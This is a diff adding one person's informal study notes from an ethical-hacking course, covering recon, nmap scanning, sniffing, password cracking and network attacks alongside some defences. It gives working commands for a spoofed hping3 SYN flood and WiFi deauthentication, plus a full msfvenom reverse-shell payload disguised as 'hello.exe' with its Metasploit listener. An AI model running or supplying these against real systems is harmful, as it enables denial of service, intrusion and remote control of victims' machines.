@@ -1,0 +1,516 @@
+poweroff is a linux command that shuts down the virtual machine or any linux device 
+
+you can change your internet settings by going to etc/netowrk/interfaces or you can do it
+graphically 
+
+vulnerability : a weakness in the system 
+
+exploit : a breach of the system cause of a vulnerability 
+
+payload : the component of an attack that is used to laucnh it 
+
+zero-day attack : is an attack that has no patch from the developer and was never discoverd
+before 
+
+pivoting or daisy chaining : is gaining knowledge or info about some other network or device
+from an exisiting hacked device 
+
+doxing : is publishing info about somene online 
+
+bot : is a program that is controlled online to perform a specific task 
+
+infosec : stands for info security and it's accomplished using CIA 
+
+CIA : Confidentiality "only people who are allowed to see the data sees the data " like encryption
+Integerity "the trueness of the data like it wasn't manipulated" , non-repudiation " means that every access should be recorded"
+Availaibility "meaning availaible to the users"
+
+attack starters or methods : 
+APT : advanced presistent threat which is an application or an attack that has been taking
+a long time to develop and grow like stuxnet worm
+
+botnet : means a network of bots that are used for a specific functionality like DOS 
+
+insider attack : means an attack coming from the inside
+
+mobile threats : are attacks done through mobiles 
+
+things that attacks take leverage of : 
+operating system , misconfiguration , application level : which means attacking a company's 
+application to take it over like shrinkwrap where the original settings are the same as 
+they came out of the box 
+
+the 5 phases of any attack :
+reconnaissance : which means collecting data in a passive or active way which means that
+we either come in contact with the target or we not 
+
+scanning : after reconnaissance we scan the info that we gathered for open ports or bad
+vulnarbilities etc...
+
+gaining access : which is by taking control of any part of the target like a computer in 
+the company , an account on the website and so on 
+and the sole purpose of this is then to escalate this access to have higher one 
+
+maintaining access : is to keep this access in place at any given time and to do that 
+hackers may plant backdoors to maintain this access 
+
+cleaning tracks : means removing tracks of what the hacker did 
+
+RECO :
+www.archive.org : shows you all the previous websites in any dates
+
+www.anywho.com : finds info about people but not in egypt 
+
+www.netcraft.com : find a lot of info about a website 
+
+you can set alerts about websites on google 
+
+the - operator in a search excludes a result from the search results on google
+
+"something" explicitly shows you results that has the word something in it 
+
+you can go into google settings and do an advanced search
+
+site:amazon : shows you only results in amazon 
+
+cache:website : shows you the cached version of a website 
+
+info:website : shows you a lot of info about a specific website 
+ 
+related:website : shows you info that is related to the url you typed 
+
+HTTRACK : takes a whole copy of the website offline analysation
+
+firebug : a tool that shows you the source HTML for a website
+
+webextractor : can collect all the data you need from a given website
+
+metagoofil : a tool that uses google search and download any type of documents that you 
+would like to have from a specific website 
+
+email tracker pro : tracks all the email info based on it's headers
+
+whois : is a tool that allows you to find more about a website using kali terminal 
+
+nslookup : shows you the ip address of the website 
+set type=mx shows you the mail exechange mail servers
+
+scanning:
+the purpose of scanning in general is to find live devices , os , ips in use
+ports (open/close)
+vulnerabilities
+
+nmap : is a tool used to scan all the open ports of devices on a network 
+nmap -sn 192.168.1.0/24 scans the network for availaible devices using arp messages
+
+banner grapping : is a way to discover the type of operating system in use
+
+we discover ports that are open either by using the tcp 3 way handshake or using the UDP
+
+if we send the server an ACK request and it replys with RST that means that there is no 
+firewall 
+
+if we send a UDP message and we recive back no response that means that the service isn't 
+up on the server
+
+the reason why we are searching for open ports is to leverage them in an unexcepected way
+
+nmap -Pn -sI 192.168.1.216 192.168.1.212
+-Pn usually nmap bings the device before it scans the ports this will skip the binging 
+process  
+-sI idle scanning
+192.168.1.216 the zombie that is going to do the scan 
+192.168.1.212 the target that is going to be scanned 
+the whole idea is to not interact with the target directly and use the zombie to do the 
+work
+
+nmap is a tool that shows you the open ports of the system and it's operating system
+and maybe it's version 
+
+nmap 192.168.1.* that shows you all the devices in this network 
+
+nmap -sP 192.168.1.* : is a ping scan that scans the whole network and finds out who 
+replys back with ping messages 
+
+nmap -sS -p0 -sV -o 192.168.1.1 : 
+sS stand for a tcp scan using SYN request 
+pO stands for port number scan 
+sV stands for searching for pc's operating system version number 
+o shows you the operating system of the host
+
+nmap --top-ports 20 192.168.1.0/24:
+that scans for a specific number of ports and in our case it's 20 ports 
+
+nmap -sT -p80 192.168.1.* : that will scan for the port 80 on all of the ip addresses 
+available in the network 
+
+nmap -sS 192.168.1.1 -D 192.168.1.200 :
+this will do the nmap by Decoying 192.168.1.200 
+
+nmap -F 192.168.1.0/24 --exclude 192.168.1.1 , 192.168.1.2 :
+-F means it will scan the top 100 ports that are popular 
+--execlude means that it will scan those hosts 
+
+nmap --script=default 192.168.1.24: 
+this uses the default script to get you more info on a target host
+
+nmap --script=dos 192.168.1.20 : 
+this does a dos attack i guess
+
+nmap --script "safe or default" 192.168.1.24 :
+runs both of the scripts 
+
+SCAPPY : helps us craft any kind of packet we want 
+send(IP(src="192.168.1.212",dst="192.168.1.1")/ICMP()/'OUR SHIT') : 
+sends an icmp message from 192.168.1.212 to destination 192.168.1.1 with content of 
+our shit
+
+l2=Ether()
+l3=IP()
+l4=TCP()
+l3=Ether(src="00:11:22:33:44:55") or l3.src="whatever"
+l4=IP(ttl=99,src="192.168.1.1")
+this creates three variables with values as ether , ip and tcp and then it changes their
+arguments later
+if you want to show the arguments do this 
+l2 and then press enter it shows you all the values of the arguments in the l2
+
+sniff(iface="eth0",prn=lambda x: x.show())
+this shows you all the packets paasing by in your network 
+
+sniff(filter="host 192.168.1.1",count=5)
+this filter the output to be only from the source ip of the host 
+
+hping3 : is used for identifying online devices that aren't replying to pings 
+
+hping3 -S 192.168.1.1 -p 80 -c 2 :
+-S sync request 
+destination
+-p 80 port 80 
+-p ++50 start from port 50 
+-c 2 do it two times 
+
+hping3 --icmp-ts -1 -c 3 192.168.1.200:
+that is send a time stamp request for the following host 
+-1 means to default the ping request to be icmp()
+-2 for udp for example 
+hping3 -2 -p 80 -c 2 192.168.1.200
+
+FLOOODDDDDINNGGGGG ATAAAAAACKKKK
+presentation 
+hping3 -S -p 80 --flood -a 192.168.1.8 192.168.1.212
+-a spoofed ip address 
+--flood attack it by flooding it 
+show the attack on the windows 8
+
+nmap -A : shows you a detailed sheet of the operating system running on a host 
+
+NESSUS : scans a system for vulunerability 
+
+proxy workbench is a proxy service that is installed to allow hosts to act as a proxy 
+
+
+enumeration : is gaining more info from devices inside a network to help gain more access
+
+snmp : simple network managment protocol which used on firewalls for protection but it's
+generally week and has to be secured 
+
+netBIOS : network Basic Input Output System and what it does is that back in the day 
+it used to do the job of the DNS to resolve the ip addresses to websites
+
+snmp uses UDP and uses ports 161/162
+
+metasploit:
+search snmp : finds all snmp tools in metasploit 
+
+LDAP is on port 389 and it's used when there is an active directory and that means 
+a single database on a computer for all other computers
+
+NTP : Network Time Protocol
+
+SYSTEM HACKING STEPS :
+gaining access 
+excalating privileges 
+executing applications 
+hiding files 
+covering tracks 
+
+ganning access:
+BYPASS CONTROLS "which is going to be done by bypassing user name and a password combination
+and that is done using one of the following methods
+non-electronic attacks "which could be done by shoulder surfing or social engineering "
+active online attacks "going to the website and trying every password combinatino possible"
+passsive online attacks "if the host is going to another website like http or ftp and using those
+credintials we could sniff the packets using MTM"
+offline attacks "which includes taking the database of the hashes and comparing it to 
+a rainbow table "
+
+escalaiting privileges : 
+by using a design flaw in the system and escalate the rights of the user that we already 
+have 
+
+maintaining access:
+by executing applications like backdoors , keyloggers and remote access applications
+that ensure that even if our access got lost we will still be able to retrieve info 
+
+hiding files :
+maybe using tool kits that hide the files deep in the system that average antiviruses cann't
+detect it
+
+covering tracks : 
+ by hiding the logs either by deleting it or by turning the whole capibility of log recording 
+off
+
+PASSWORD CRACKING OVERVIEW :
+dictionary vs brute forcing : dictionary is a list of words that the hacker is trying 
+againist the system itself 
+brute forcing is trying every combination possible for a password 
+hybird attack is a combination of brute and dictionary attacks 
+
+rainbow tables are big table of hashes 
+
+sniffing or mitm : using wireshark to sniff packets 
+
+steganography : which is putting malwares and trojans inside of a media file 
+
+
+aireplay-ng -0 0 -a "bssid here" wlan0 : deathunticates everyone bitcchh!
+aircrack-ng OURFILE.cap -w Desktop/wordlist : this compares our file with the passcode list
+
+
+cain and abel : is a tool usef for man in the middle attack 
+
+ARP poising routing "apr": is used for MITM attacks where it spoofs the mack addresses of devices 
+to trick two hosts communicating with each other to send their trafic to a third host
+between them 
+
+rainbow table attack : is an attack that takes a password hash and compares it to other 
+hashes 
+
+daaaaaaaaaaaaaa
+presentation 
+chntpw : change NT passwrod , is a way to crack any password on an operating sytem
+it requires physical access to the pc 
+BIOS to be able to boot CD or usb
+then modify the sam user 
+use the older version 
+write the name in decimal 0x3e9 for example
+
+yersinia is an attack that cause DHCP starvation
+
+presentation 
+gaining remote access to another device 
+info : if a device initiated a connection the firewall allows for the reply to come back
+in 
+so in order to be able to connect to the victim freely we have to make it initiate the 
+connnection 
+by 
+create the payload 
+put the payload on a server 
+the victim executes it and builds the connection 
+the tool that creates payloads is called msfvenom 
+if you want to view the tools that you are able to craft then do msfvenom --list payloads
+
+CREATING THE PAYLOAD:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=1234 --format=exe >hello.exe
+-p is the type of the payload 
+LHOST : is the ip address that the victim is going to be connecting to 
+LPORT : same as LHOST
+--format : which is the format of the file 
+> hello.exe is the file that the victim is going to see 
+
+
+HOSTING THE PAYLOAD ON A SERVER :
+service apache2 start 
+we want to copy our attack file to the host of the server 
+at var www hml and then put the file there 
+our server has to be listening to the connection initiated by the victim so 
+we are going to open the port by 
+running msfconsole 
+if the data base isn't working run msfdb run 
+use exploit/multi/handler : allows us to use the exploit that we spereatly created 
+set LHOST 192.168.1.1 : allows the victim to connect to our server 
+set LPORT 1234 : ALLOWS victim to cnnect to our port 
+set payload windows/meterpreter/reverse_tcp : that allows it to detect the type of the 
+payload 
+show options : allows us to see what we have cofigured 
+exploit -j -z : to allow multiple sessions to connect to our server 
+session -i to show your session 
+session -i 1 to connect to the first session 
+
+video 53:
+ADS : alternate data streams 
+for example when you have the proprties of a file you don't open two files 
+you only open one and the other is opened automatically opened with the first one 
+we can use that to run and associate excutables
+
+presentation :
+stegonagraphy 
+what is stegaonagraphy
+how does it work 
+steghide embed -cf "crrier" -ef hidden 
+steghide extract -sf file to show file 
+
+video 57 :
+malware : stands for malicious software
+
+video 58 :
+wrapping is binging malicious code in an unsuspicous code 
+vnc : virtual network computing that allows another computer control over network connection
+RAT : remote access trojan that uses VNC technology and control an unauthorised pc 
+DDNS : that allows for new ip addresses to be allocated to the same name server that you 
+have 
+covert : is the term used for misusing protocols for unauthorised usage 
+
+video 59 : 
+presentation 
+set : social engineering toolkit is a kali linux tool for creating trojans 
+
+video 60 : 
+virus : it's a program that replicates itself very fast and causes infection for pcs 
+it can transform it's signature to avoid being detected by antiviruses 
+a virus can use encryption 
+they can alter or change data 
+a virus waits for user interaction to replicate itself and a worm replicates itself without
+user interaction 
+
+viruse stages :
+1- design 
+2- replication 
+3- activation /launch 
+4- detection 
+5- adds the signature of the virus to the data base software
+
+types of viruses
+boot sector  : an MBR is called Master Boot Record that allows for the hard drive to bootup
+if the viruse affects the MBR then the viruse loads first before anything else 
+
+rootkits : they put themselves on the MBR 
+
+stealth or tunneling : that is a virus that tricks the antivirus into scanning something 
+else other than itself so the antivirus can't find it 
+
+polymorphic : is a virus that changes itself upon scanning and it uses an engine for that 
+so it's very hard to be detected by traditional antiviruses 
+
+cavity virus : it takes files and destroys their content and fills the file with null bytes
+that the file has the same size but it's content is destroyed 
+
+presentation:
+you can simply in a text document wright a virus like this 
+@echo off 
+:loop
+start
+start www.google.com
+goto :loop
+
+
+video 64: 
+
+md5sum file.zip "for example" : generates a hash for the file.zip to know if it's untouched
+or not 
+
+video 65: 
+
+promiscuous mode : is a mode for the network interface card that allows it to recieve 
+any frame even if it'sn't destined to itself and doesn't have a MAC address 
+
+there are two types of sniffing 
+
+passive : is when there is a very old technology used like a hub and the packets are 
+forwarded to every other port so when a hacker put his network card in promiscuous mode
+that is called passive sniffing 
+
+active sniffing : is when there is a switch used for example and every packet is sent only
+to it's specific destination 
+
+mac flooding : is an example of an active sniffing attack that forward a lot of spoofed
+mac addresses that make the switch drops CAM table and starts forwarding packets to every
+port 
+
+DHCP attacks : is where the hacker suggests itself as a server and a default getway 
+so packets will be forwarded to the hacker and it will be a man in the middle attack
+
+arp poising : is where an infected pc thinks that the layer2 address of the gateway is 
+the attackers address and then the attacker will be the gateway of the infected device 
+
+DNS poisining  : is where the DNS server is attacked and then it resolves the addresses 
+to the hacker which allows him to be able to sniff the data 
+
+winpcap : is a software that allows network cards that are in promiscious mode to analayse
+data that isn't meant for them 
+
+video 66 : 
+
+CAM table overflow attack : any device that is connected to the network can send thousands
+of spoofed mac address which is going to drop the cam table stored in the switch and that
+will cause the switch to deal with every packet as an unknown packet and forward it to 
+every port which allows the hacket to spy on conversations between devices on the switch 
+
+the CAM overflow attacks is defended by port security and having a limit for the number of
+MAC addresses that every port can learn 
+and the actions taken after the violation of ports 
+is 
+protect : which is to drop every mac address after the limit but it doesn't notify anyone 
+restrict : same as protect but with notifications 
+shutdown : shuts down the port when it exceeds the limit and notifications are sent 
+and it's the default violation behaviour 
+shutdown vlan : is the the as shutdown but for vlans 
+
+
+video 67 :
+
+the steps that are required for gaining an ip address are 
+d stands for Discover packet , done by the client	
+o offer packet that is done by the DHCP server 
+r reply packet done by the client 
+a acknowledge which is done by the DHCP 
+
+rouge DHCP server attack steps:
+
+connect a device to the switch and then cause dhcp startvation 
+
+then the connected device will act as a DHCP server and all the newly connected devices
+are going to use it as a dhcp server and then all the packets coming out of the switch 
+will be forwarded to the attackers device and it will be a valid MITM  attack 
+
+remember to take the wireshark course
+ 
+DHCP snooping : is a security protocol on ports that doesn't allow for DHCP messages to 
+be sent in any port by not allowing any device to do a DHCP offer or DHCP acknowlegdgment 
+video 68:
+
+gratuitous ARP : is an ARP that is sent but was not required from the sender and 
+it has the senders layer 2 address 
+
+proxy arp : is when a device is responding in behalf of another device 
+
+ARP poisining : is done by send a gratuitous arp from the attacker to the default 
+gateway telling that the victims pc's macaddress is the attackers mac address and 
+send the victim a gratuitous arp that tells it that the gateways mac address is the 
+attacker's mac address so it would be a MITM attack 
+
+ARP inspection : is used to compare the original mac address of the device to the 
+arp payload of the arp message that the device is sending to detect wether the arp message
+is true or not using the dhcp snooping table 
+
+video 70 :
+volumetric attack is a ddos attack that counsumes all the resources the available from the 
+botnet
+
+fragmentation attacks: are when the server is tryping to reassemble defragmented packets
+
+tcp-state attacks : where a syn request is sent and holds resources from the replying server
+
+video 71 :
+
+network layer session hijacking is spoofing the mac and ip addresses to trick something
+into beleiving that we are someone else
+
+application layer session hijacking : is tricking an app into beleiving that we are someone
+we are not 
+
+cookies are used for pressistence of the session so the user doesn't have to login in 
+every time to login 
+
+common vulnerabilities and exposures CVEs
